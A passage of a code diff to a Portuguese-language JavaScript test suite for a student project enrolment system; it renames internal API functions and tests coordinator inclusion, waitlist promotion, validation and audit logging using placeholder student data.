+  // Sem projeto (o formulário interno): `validarInscricao_` não exige a ciência,
   // e os dois aceites podem chegar vazios. A mesma matrícula cabe: a chave de
   // dedup leva o projeto, e "sem projeto" é outro endereço.
-  const semProjeto = amb.api.submeterInscricao({
+  const semProjeto = amb.api.submeterInscricao_({
     origem: 'SITE_EXTERNO', tempoPreenchimento: 9000,
     matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com',
     declara_ciencia: '', autoriza_imagem: '', consentimento_lgpd: true
@@ -2887,8 +2930,8 @@ teste('o envelope público NÃO tem como pedir o que só a coordenação grava: 
 });
 
 teste('passa por fora: janela encerrada, cadastro_aberto=NAO, anti-abuso armado e projeto ESGOTADO — e a resposta diz 3/2', () => {
-  // Mutação que derruba: qualquer `recusaPelaJanela_()`, `config('cadastro_aberto')`
-  // ou `reservarVaga` dentro de `incluirInscricao` — a coordenação ficaria
+  // Mutação que derruba: qualquer `recusaPelaJanela_()`, `config_('cadastro_aberto')`
+  // ou `reservarVaga_` dentro de `incluirInscricao_` — a coordenação ficaria
   // trancada do lado de fora junto com o público, que é o defeito relatado. E
   // `verificarAntiAbuso_(payload)` antes de gravar (o item j do cabeçalho): o
   // teto por hora é zerado aqui e o honeypot vai preenchido, que é o que um
@@ -2897,22 +2940,22 @@ teste('passa por fora: janela encerrada, cadastro_aberto=NAO, anti-abuso armado 
   // cada inclusão gastaria uma escrita em PropertiesService (`throttle_*`) que
   // é do formulário público, não desta porta.
   const amb = cenarioInclusao();
-  amb.api.gravarConfig('cadastro_aberto', 'NAO');
-  amb.api.gravarConfig('inscricoes_fim', '2020-01-01 00:00');
-  amb.api.gravarConfig('limite_inscricoes_hora', '0');
+  amb.api.gravarConfig_('cadastro_aberto', 'NAO');
+  amb.api.gravarConfig_('inscricoes_fim', '2020-01-01 00:00');
+  amb.api.gravarConfig_('limite_inscricoes_hora', '0');
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110101', nome: 'Um Aluno', email: 'um@exemplo.com' });
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110102', nome: 'Dois Aluno', email: 'dois@exemplo.com' });
-  igual(amb.api.listarProjetos(false).filter((p) => p.id === 'p2')[0].situacao, 'ESGOTADO');
+  igual(amb.api.listarProjetos_(false).filter((p) => p.id === 'p2')[0].situacao, 'ESGOTADO');
 
   // O CONTROLE: o público está barrado de verdade neste cenário.
   amb.api.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
-  const publico = amb.api.submeterInscricao({
+  const publico = amb.api.submeterInscricao_({
     projeto_id: 'p2', matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com',
     curso_fase: 'ADS - ADS11', declara_ciencia: true, consentimento_lgpd: true, origem: 'SITE'
   });
   igual(publico.ok, false, 'o formulário devia estar fechado');
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true, website: 'robo' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true, website: 'robo' }));
   igual(r.ok, true, r.erro);
   igual(r.inscritos, 3, 'o contador tem de dizer 3, e não arredondar para 2');
   igual(r.vagas, 2);
@@ -2923,7 +2966,7 @@ teste('passa por fora: janela encerrada, cadastro_aberto=NAO, anti-abuso armado 
     'a inclusão gastou o contador por hora do formulário público');
   igual(linhasDoLog(amb, 'BLOQUEIO').length, 0, 'a coordenação foi tratada como robô');
 
-  const p2 = chamar(amb, 'painelProjetos').itens.filter((p) => p.id === 'p2')[0];
+  const p2 = chamar(amb, 'painelProjetos_').itens.filter((p) => p.id === 'p2')[0];
   igual(p2.inscritos, 3, 'o painel arredondou a ocupação para o teto');
 });
 
@@ -2935,7 +2978,7 @@ teste('projeto cheio SEM confirmar_teto: pergunta, diz os números e não escrev
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110102', nome: 'Dois Aluno', email: 'dois@exemplo.com' });
   amb.zerar();
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2' }));
   igual(r.ok, false);
   igual(r.precisa_confirmar, true);
   igual(r.inscritos, 2);
@@ -2953,7 +2996,7 @@ teste('projeto com vagas ilimitadas (0) nunca pergunta', () => {
   const amb = cenarioInclusao();
   semearProjeto(amb.api, 'p3', 'Aberto a todos', 0);
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p3' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p3' }));
   igual(r.ok, true, r.erro);
   igual(r.precisa_confirmar, undefined);
   igual(r.vagas, 0);
@@ -2961,15 +3004,15 @@ teste('projeto com vagas ilimitadas (0) nunca pergunta', () => {
 });
 
 teste('a mesma pessoa no mesmo projeto é recusada pelo BANCO, com o protocolo e sem outra escrita', () => {
-  // Mutação que derruba: `registrar` antes de olhar `duplicada`, ou uma consulta
+  // Mutação que derruba: `registrar_` antes de olhar `duplicada`, ou uma consulta
   // "já existe?" antes de gravar — a conferência otimista que 04_Inscricoes.gs
   // tirou do caminho.
   const amb = cenarioInclusao();
-  const primeira = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const primeira = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   igual(primeira.ok, true, primeira.erro);
   amb.zerar();
 
-  const segunda = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ nome: 'Outro Nome', email: 'outro@exemplo.com' }));
+  const segunda = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ nome: 'Outro Nome', email: 'outro@exemplo.com' }));
   igual(segunda.ok, false);
   igual(segunda.erro, 'Este aluno já está inscrito neste projeto. Protocolo: ' + primeira.id + '.');
 
@@ -2985,7 +3028,7 @@ teste('a mesma pessoa no mesmo projeto é recusada pelo BANCO, com o protocolo e
 /**
  * A fila de espera deste projeto, para os dois cenários em que a coordenação
  * PRECISA da porta por fora — e em que o caminho que a primeira versão apontava
- * (Auditório → Fila de espera → Promover) recusa: `promoverDaEspera` respeita o
+ * (Auditório → Fila de espera → Promover) recusa: `promoverDaEspera_` respeita o
  * teto e a situação do projeto, e quem está na fila está lá PORQUE o projeto
  * encheu; depois do prazo, ele está FECHADO. Era um beco sem saída provado por
  * sonda: incluir recusava mandando promover, e promover recusava com "as vagas
@@ -2993,8 +3036,8 @@ teste('a mesma pessoa no mesmo projeto é recusada pelo BANCO, com o protocolo e
  */
 function cenarioDaFila(extraDoProjeto, ocupam) {
   const amb = cenarioInclusao();
-  amb.api.gravarConfig('vagas_excedentes_em_espera', 'SIM');
-  if (extraDoProjeto) amb.api.atualizar('projetos', 'p2', extraDoProjeto);
+  amb.api.gravarConfig_('vagas_excedentes_em_espera', 'SIM');
+  if (extraDoProjeto) amb.api.atualizar_('projetos', 'p2', extraDoProjeto);
   if (ocupam) {
     inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110101', nome: 'Um Aluno', email: 'um@exemplo.com' });
     inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110102', nome: 'Dois Aluno', email: 'dois@exemplo.com' });
@@ -3005,7 +3048,7 @@ function cenarioDaFila(extraDoProjeto, ocupam) {
     matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com',
     curso_fase: 'ADS - ADS11', whatsapp: '48988887777', em_espera: 'SIM'
   });
-  amb.fila.criado_em = amb.api.ler('inscricoes', amb.fila.id).criado_em;
+  amb.fila.criado_em = amb.api.ler_('inscricoes', amb.fila.id).criado_em;
   igual(amb.api.contarInscritos_('p2'), ocupam ? 2 : 0, 'quem espera não ocupa vaga');
   igual(amb.api.contarEmEspera_('p2'), 1);
   return amb;
@@ -3032,23 +3075,23 @@ function conferirPromovida(amb, r) {
   igual(doc.consentimento_lgpd, 'SIM');
   igual(doc.criado_em, amb.fila.criado_em, 'a chegada na fila é a data que a inscrição guarda');
   igual(amb.api.contarEmEspera_('p2'), 0, 'a fila deste projeto tinha de ficar vazia');
-  igual(chamar(amb, 'filaDeEspera').fila.length, 0, 'a aba Auditório ainda mostra a pessoa na fila');
+  igual(chamar(amb, 'filaDeEspera_').fila.length, 0, 'a aba Auditório ainda mostra a pessoa na fila');
 }
 
 teste('cenário A — projeto CHEIO com a matrícula na fila: sem confirmar_teto pergunta e não escreve NADA; com confirmar_teto PROMOVE a inscrição que existe', () => {
   // Mutação que derruba: tratar todo 409 como "já está inscrito" (a primeira
-  // versão), ou mandar a coordenação ao Auditório (a segunda — `promoverDaEspera`
+  // versão), ou mandar a coordenação ao Auditório (a segunda — `promoverDaEspera_`
   // recusa em projeto cheio, e este cenário É o projeto cheio); gravar
-  // `em_espera: 'NAO'` em vez de apagar (`undefined` abaixo); usar `atualizar`
+  // `em_espera: 'NAO'` em vez de apagar (`undefined` abaixo); usar `atualizar_`
   // só com as duas chaves (a máscara não apaga campo — e mandar o documento
-  // pela metade a `escreverEmLote` apagaria o resto, que `curso_fase` e
+  // pela metade a `escreverEmLote_` apagaria o resto, que `curso_fase` e
   // `declara_ciencia` vigiam); ou promover ANTES da pergunta do teto (a
   // primeira chamada escreveria).
   const amb = cenarioDaFila(null, true);
   amb.zerar();
 
   // Sem confirmar_teto: a pergunta de sempre, e ZERO escritas — nem a tentativa.
-  const pergunta = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2' }));
+  const pergunta = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2' }));
   igual(pergunta.ok, false);
   igual(pergunta.precisa_confirmar, true);
   igual(pergunta.erro, 'Este projeto está com 2/2. Incluir deixa 3/2.');
@@ -3058,7 +3101,7 @@ teste('cenário A — projeto CHEIO com a matrícula na fila: sem confirmar_teto
   amb.zerar();
 
   // Com confirmar_teto: a promoção, e o projeto fica 3/2.
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
   conferirPromovida(amb, r);
   igual(r.inscritos, 3);
   igual(r.vagas, 2);
@@ -3087,7 +3130,7 @@ teste('cenário A — projeto CHEIO com a matrícula na fila: sem confirmar_teto
 
   // Promovida, a pessoa OCUPA vaga: o Incluir de novo é a duplicata comum.
   amb.zerar();
-  const deNovo = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  const deNovo = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
   igual(deNovo.ok, false);
   igual(deNovo.promovida_da_fila, undefined);
   verdadeiro(/já está inscrito neste projeto\. Protocolo: /.test(deNovo.erro), deNovo.erro);
@@ -3095,14 +3138,14 @@ teste('cenário A — projeto CHEIO com a matrícula na fila: sem confirmar_teto
 });
 
 teste('cenário B — projeto FECHADO (inscrições encerradas) com vaga e a matrícula na fila: promove sem perguntar, por fora da situação', () => {
-  // Mutação que derruba: recusar por `situacaoDe_` (é o que `promoverDaEspera`
+  // Mutação que derruba: recusar por `situacaoDe_` (é o que `promoverDaEspera_`
   // faz, e é o beco: depois do prazo todo projeto está fechado), ou perguntar
   // o teto com vaga sobrando.
   const amb = cenarioDaFila({ inscricoes_abertas: 'NAO', vagas: '5' }, false);
-  igual(amb.api.listarProjetos(false).filter((p) => p.id === 'p2')[0].situacao, 'FECHADO');
+  igual(amb.api.listarProjetos_(false).filter((p) => p.id === 'p2')[0].situacao, 'FECHADO');
   amb.zerar();
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2' }));
   conferirPromovida(amb, r);
   igual(r.inscritos, 1);
   igual(r.vagas, 5);
@@ -3121,14 +3164,14 @@ teste('cenário C — matrícula da fila FORA da lista oficial: promover não av
   // tirar o `&& !promovida` do aviso (o amarelo aparece), ou responder
   // `matricula_conferida` fixo em 'NAO' na promoção em vez de ler do documento.
   const amb = cenarioDaFila(null, true);
-  igual(amb.api.matriculaConhecida('9110002'), false, 'o cenário exige uma matrícula fora da lista');
+  igual(amb.api.matriculaConhecida_('9110002'), false, 'o cenário exige uma matrícula fora da lista');
   const naFila = inscrever(amb.api, 'p2', 'Robótica', {
     matricula: '9110002', nome: 'Outra Exemplo', email: 'outra@exemplo.com',
     matricula_conferida: 'SIM', em_espera: 'SIM'
   });
   amb.zerar();
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({
     projeto_id: 'p2', matricula: '9110002', nome: 'Outra Exemplo', email: 'outra@exemplo.com', confirmar_teto: true
   }));
   igual(r.ok, true, r.erro);
@@ -3136,8 +3179,8 @@ teste('cenário C — matrícula da fila FORA da lista oficial: promover não av
   igual(r.promovida_da_fila, true);
   igual(r.aviso, '', 'avisou "não conferida" sobre um documento que não foi reescrito');
   igual(r.matricula_conferida, 'SIM', 'a marca da resposta tem de ser a do documento, não a da lista de hoje');
-  igual(amb.api.ler('inscricoes', naFila.id).matricula_conferida, 'SIM');
-  igual(amb.api.ler('inscricoes', naFila.id).em_espera, undefined);
+  igual(amb.api.ler_('inscricoes', naFila.id).matricula_conferida, 'SIM');
+  igual(amb.api.ler_('inscricoes', naFila.id).em_espera, undefined);
 });
 
 teste('a fila de OUTRO projeto não é promovida pelo Incluir: grava a inscrição nova, avisa o outro projeto, e a fila fica onde está', () => {
@@ -3145,7 +3188,7 @@ teste('a fila de OUTRO projeto não é promovida pelo Incluir: grava a inscriç�
   // que derruba: promover qualquer inscrição em espera da pessoa, e não a da
   // chave recusada.
   const amb = cenarioDaFila(null, true);
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p1' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p1' }));
   igual(r.ok, true, r.erro);
   igual(r.promovida_da_fila, false);
   verdadeiro(/^Incluído\. Protocolo /.test(r.mensagem), r.mensagem);
@@ -3158,18 +3201,18 @@ teste('a fila de OUTRO projeto não é promovida pelo Incluir: grava a inscriç�
 
 teste('formato inválido recusa ANTES de ler qualquer coisa — a régua é a do formulário', () => {
   // Mutação que derruba: mover `conferirFormatoDaInclusao_` para depois de
-  // `projetoPorId`, ou trocar `erroFormatoMatricula_` por uma faixa própria
+  // `projetoPorId_`, ou trocar `erroFormatoMatricula_` por uma faixa própria
   // (4..20) — `911` passaria aqui e nunca casaria com a lista oficial.
   const amb = cenarioInclusao();
   amb.zerar();
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ matricula: '911' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ matricula: '911' }));
   igual(r.ok, false);
   verdadeiro(/7 d.gitos/.test(r.erro), 'a recusa precisa dizer o tamanho certo: ' + r.erro);
   igual(foraDaConfig(amb.falso).length, 0, 'recusou depois de já ter lido o banco');
 
-  // As outras réguas, juntas na mesma frase, como `validarInscricao` faz.
-  const tudo = chamar(amb, 'incluirInscricao', {
+  // As outras réguas, juntas na mesma frase, como `validarInscricao_` faz.
+  const tudo = chamar(amb, 'incluirInscricao_', {
     projeto_id: 'p1', matricula: '', nome: '  ', email: 'sem-arroba', whatsapp: '123'
   });
   igual(tudo.ok, false);
@@ -3179,14 +3222,14 @@ teste('formato inválido recusa ANTES de ler qualquer coisa — a régua é a do
   igual(foraDaConfig(amb.falso).length, 0);
 
   // E o que a coordenação PODE: nome de uma palavra, sem curso e fase, sem WhatsApp.
-  const curto = chamar(amb, 'incluirInscricao', { projeto_id: 'p1', matricula: '9110001', nome: 'Xu', email: 'xu@exemplo.com' });
+  const curto = chamar(amb, 'incluirInscricao_', { projeto_id: 'p1', matricula: '9110001', nome: 'Xu', email: 'xu@exemplo.com' });
   igual(curto.ok, true, curto.erro);
 });
 
 teste('projeto inexistente é recusado, e a matrícula não chega a ser consultada', () => {
   const amb = cenarioInclusao();
   amb.zerar();
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p9' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p9' }));
   igual(r.ok, false);
   verdadeiro(/Recarregue a lista/.test(r.erro), r.erro);
   igual(leiturasForaDaConfig(amb.falso).length, 1, 'só o projeto foi lido');
@@ -3197,7 +3240,7 @@ teste('matrícula fora da lista oficial ENTRA marcada como não conferida, e a r
   // Mutação que derruba: gravar `matricula_conferida: 'SIM'` fixo, ou recusar
   // quem não está na lista (o modo BLOQUEAR é do público; a coordenação decide).
   const amb = cenarioInclusao();
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ matricula: '9110999' }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ matricula: '9110999' }));
   igual(r.ok, true, r.erro);
   igual(r.matricula_conferida, 'NAO');
   verdadeiro(r.aviso.indexOf('9110999') !== -1 && r.aviso.indexOf('não está na lista oficial') !== -1, r.aviso);
@@ -3214,7 +3257,7 @@ teste('já inscrito em OUTRO projeto: grava mesmo assim, e o aviso nomeia o proj
   const amb = cenarioInclusao();
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com' });
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   igual(r.ok, true, r.erro);
   verdadeiro(r.aviso.indexOf('Robótica') !== -1, 'o aviso não nomeou o outro projeto: ' + r.aviso);
   verdadeiro(r.aviso.indexOf('Alunos → Editar → Projeto') !== -1, r.aviso);
@@ -3226,12 +3269,12 @@ teste('já inscrito em OUTRO projeto: grava mesmo assim, e o aviso nomeia o proj
 teste('a trilha diz quem, em que projeto e quanto ficou — e NUNCA o dado do aluno', () => {
   // Mutação que derruba: pôr `dados.nome`, `dados.matricula` ou o e-mail do
   // aluno no detalhe do log — é a regra de `registrarEdicao_`, e a afirmação
-  // aqui é NEGATIVA de propósito. A outra: `exigirAdmin` deixar de anotar o
+  // aqui é NEGATIVA de propósito. A outra: `exigirAdmin_` deixar de anotar o
   // operador, e a coluna "Quem" voltar a 'anonimo' — que é o que
-  // `usuarioAtual()` responde AQUI (`cenarioInclusao` roda com `usuario: ''`,
+  // `usuarioAtual_()` responde AQUI (`cenarioInclusao` roda com `usuario: ''`,
   // a realidade do painel publicado) e em produção.
   const amb = cenarioInclusao();
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
 
   const linhas = linhasDoLog(amb, 'INSCRICAO_INCLUIDA');
   igual(linhas.length, 1, 'a inclusão não deixou trilha');
@@ -3254,7 +3297,7 @@ teste('acima do teto, a trilha diz ACIMA DO TETO — é ela que responde "por qu
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110101', nome: 'Um Aluno', email: 'um@exemplo.com' });
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110102', nome: 'Dois Aluno', email: 'dois@exemplo.com' });
 
-  chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
   const linha = linhasDoLog(amb, 'INSCRICAO_INCLUIDA')[0];
   igual(linha.detalhe, 'no projeto Robótica (3/2) — ACIMA DO TETO');
 });
@@ -3266,24 +3309,24 @@ teste('o custo é o do cabeçalho: 3 leituras de ponto, 2 agregações, 3 consul
   // fichas que a reclamam), mais uma leitura de ponto (a ficha que ainda não
   // existe, de onde sairia o `_versao`) e mais uma escrita (a ficha).
   //
-  // Mutação que derruba: chamar `reconciliar()` daqui — as três coleções inteiras
-  // por inclusão, que é o preço que `editarAluno` só paga quando a CHAVE muda; ou
+  // Mutação que derruba: chamar `reconciliar_()` daqui — as três coleções inteiras
+  // por inclusão, que é o preço que `editarAluno_` só paga quando a CHAVE muda; ou
   // reler o matriculado que esta função já leu (a leitura de ponto viraria 4).
   const amb = cenarioInclusao();
   amb.zerar();
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   igual(r.ok, true, r.erro);
 
   igual(leiturasForaDaConfig(amb.falso).length, 3, 'o projeto, a lista oficial e a ficha do aluno');
   igual(agregacoes(amb.falso).length, 2, 'o teto antes e a ocupação depois');
   igual(consultas(amb.falso).length, 3, 'os outros projetos da pessoa, as inscrições da matrícula e as fichas dela');
   igual(gravacoes(amb.falso).length, 3, 'a inscrição, o log e a ficha');
-  igual(amb.api.contar('alunos'), 1, 'a ficha em alunos tem de nascer AQUI');
+  igual(amb.api.contar_('alunos'), 1, 'a ficha em alunos tem de nascer AQUI');
 
   // Com `confirmar_teto` a contagem de antes é pulada: uma agregação a menos.
   amb.zerar();
-  chamar(amb, 'incluirInscricao', pedidoDeInclusao({ matricula: '9110002', confirmar_teto: true }));
+  chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ matricula: '9110002', confirmar_teto: true }));
   igual(agregacoes(amb.falso).length, 1);
 });
 
@@ -3299,19 +3342,19 @@ teste('a ficha aparece NA HORA, e a rodada seguinte concorda com ela', () => {
   // Mutação que derruba: `reconciliacao_pendente: true` fixo; ou o incremental
   // produzir documento diferente do da rodada — `escritos` viraria 1.
   const amb = cenarioInclusao();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });   // a linha de base: nada a cruzar
-  igual(chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 }).total, 1, 'só a matriculada, SO_MATRICULADO');
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });   // a linha de base: nada a cruzar
+  igual(chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50 }).total, 1, 'só a matriculada, SO_MATRICULADO');
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   igual(r.reconciliacao_pendente, false, r.reconciliacao_motivo);
 
   // SEM Atualizar nenhum no meio: a lista já mostra a ficha certa.
-  const agora = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 });
+  const agora = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50 });
   const ficha = agora.itens.filter((a) => a.matricula === '9110001')[0];
   verdadeiro(ficha, 'a aluna incluída não apareceu na lista');
   igual(ficha.status, 'CONFIRMADO', 'inscrição + lista oficial = confirmada');
 
-  const depois = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const depois = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(depois.reconciliacao.rodou, true, 'a contagem mudou: a rodada de auditoria continua rodando');
   igual(depois.reconciliacao.resumo.escritos, 0, 'a rodada discordou do incremental e reescreveu a ficha');
 });
@@ -3322,14 +3365,14 @@ teste('promovida da fila sem rodada nenhuma antes: a ficha NASCE aqui', () => {
   // existia). Mutação que derruba: pular o incremental na promoção — a ficha não
   // existiria, e nem o Atualizar seguinte a criaria, porque o freio 1 fecharia.
   const amb = cenarioDaFila(null, true);
-  igual(amb.api.contar('alunos'), 0, 'o cenário exige o cadastro ainda sem ficha nenhuma');
+  igual(amb.api.contar_('alunos'), 0, 'o cenário exige o cadastro ainda sem ficha nenhuma');
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
   igual(r.ok, true, r.erro);
   igual(r.promovida_da_fila, true);
   igual(r.reconciliacao_pendente, false, r.reconciliacao_motivo);
 
-  const ficha = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 }).itens
+  const ficha = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50 }).itens
     .filter((a) => a.matricula === '9110001')[0];
   verdadeiro(ficha, 'a ficha de quem foi promovido não nasceu');
   igual(ficha.status, 'CONFIRMADO');
@@ -3346,10 +3389,10 @@ teste('declínio na promoção: a marca fica com -1, e o Atualizar seguinte cruz
   inscrever(amb.api, 'p2', 'Robótica', {
     matricula: '9110002', nome: 'Outra Exemplo', email: 'outra@exemplo.com', em_espera: 'SIM'
   });
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });   // a marca nasce aqui
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });   // a marca nasce aqui
   igual(amb.api.marcaDaReconciliacao_().inscricoes, 4, 'a marca precisa nascer com a contagem real');
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({
     projeto_id: 'p2', matricula: '9110002', nome: 'Outra Exemplo', email: 'outra@exemplo.com',
     confirmar_teto: true
   }));
@@ -3358,9 +3401,9 @@ teste('declínio na promoção: a marca fica com -1, e o Atualizar seguinte cruz
   igual(r.reconciliacao_pendente, true);
   igual(r.reconciliacao_motivo, 'a matrícula não está na lista oficial importada');
 
-  igual(amb.api.contar('inscricoes'), 4, 'promover não cria documento: é por isso que o freio 1 não vê nada');
+  igual(amb.api.contar_('inscricoes'), 4, 'promover não cria documento: é por isso que o freio 1 não vê nada');
   igual(amb.api.marcaDaReconciliacao_().inscricoes, -1, 'o declínio não declarou o cadastro sujo');
-  igual(chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
+  igual(chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
 });
 
 teste('o sucesso NÃO mexe na marca: nem nos contadores, nem no gasto do dia', () => {
@@ -3370,10 +3413,10 @@ teste('o sucesso NÃO mexe na marca: nem nos contadores, nem no gasto do dia', (
   // cruzado", que é falso: o incremental não roda remoções nem o agregado.
   // Mutação que derruba: chamar `marcarReconciliacao_` no sucesso.
   const amb = cenarioInclusao();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   const antes = amb.propriedades.get('painel_reconciliacao');
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   igual(r.reconciliacao_pendente, false, r.reconciliacao_motivo);
 
   igual(amb.propriedades.get('painel_reconciliacao'), antes, 'a inclusão bem-sucedida mexeu na marca');
@@ -3386,19 +3429,19 @@ teste('o sucesso que NÃO precisou gravar também não mexe na marca — quem de
   // véspera e promover não muda nome, projeto, curso nem status.
   //
   // Mutação que derruba: trocar `if (!cruzamento.feito)` por
-  // `if (!cruzamento.escreveu)` em `incluirInscricao`. A suíte inteira continua
+  // `if (!cruzamento.escreveu)` em `incluirInscricao_`. A suíte inteira continua
   // verde com ela, e o efeito em produção é uma rodada completa (~5.500 leituras)
   // a cada promoção idempotente — o desperdício que a regra da marca existe para
   // impedir, dentro do clique mais caro do dia do evento.
   const amb = cenarioDaFila(null, true);
   // O Atualizar da véspera: a ficha de quem espera já nasce aqui (a fila é uma
   // inscrição como outra qualquer — `montarAluno_` não lê `em_espera`).
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   const antes = amb.propriedades.get('painel_reconciliacao');
   verdadeiro(amb.api.marcaDaReconciliacao_().inscricoes > 0, 'a marca precisa nascer com a contagem real');
 
   amb.zerar();
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
   igual(r.ok, true, r.erro);
   igual(r.promovida_da_fila, true);
   igual(r.reconciliacao_pendente, false, r.reconciliacao_motivo);
@@ -3416,13 +3459,13 @@ teste('o sucesso que NÃO precisou gravar também não mexe na marca — quem de
 
 teste('a falha do incremental não derruba a inclusão: o protocolo sai, e a tela sabe que a ficha ficou para depois', () => {
   // A inscrição já está gravada e registrada quando o incremental roda. Mutação
-  // que derruba: deixar o erro subir — o `catch` de `incluirInscricao` devolveria
+  // que derruba: deixar o erro subir — o `catch` de `incluirInscricao_` devolveria
   // "Falha ao incluir" sobre uma inscrição que ENTROU, e a coordenação a incluiria
   // de novo (e leria "já está inscrito").
   const amb = cenarioInclusao();
   amb.api.reconciliarPessoa_ = () => { throw new Error('a rede caiu no meio'); };
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
 
   igual(r.ok, true, r.erro);
   verdadeiro(r.mensagem.indexOf('Protocolo ' + r.id) !== -1, r.mensagem);
@@ -3439,20 +3482,20 @@ teste('a decisão da coordenação sobrevive à inclusão da MESMA pessoa em out
   // dentro de um clique que a coordenação acha que só cria uma inscrição.
   const amb = cenarioInclusao();
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com' });
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
 
-  const id = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 }).itens
